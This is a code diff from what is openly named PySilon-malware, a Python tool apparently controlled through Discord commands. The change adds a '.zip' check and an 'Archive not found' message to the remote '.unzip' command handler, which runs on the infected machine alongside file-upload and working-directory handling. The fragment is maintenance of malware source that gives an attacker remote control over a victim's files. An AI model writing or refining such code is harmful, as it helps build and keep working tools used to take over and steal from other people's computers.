@@ -152,9 +152,10 @@ async def file_uploading(ctx, argument=None, name_of_file=None):
 async def unzip_command(ctx, filename=None):
     await ctx.message.delete()
 
-    if filename != None:
+    if filename != None and filename.endswith(".zip"):
         if os.path.exists('/'.join(working_directory) + '/' + filename): await unzip(ctx, '/'.join(working_directory) + '/' + filename)
         elif os.path.exists(filename): await unzip(ctx, filename)
+        else: await ctx.send('```❗ Archive not found```')
     else:
         embed = discord.Embed(title="📛 Error",description=f'```Syntax: .unzip <path/to/zip_file>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
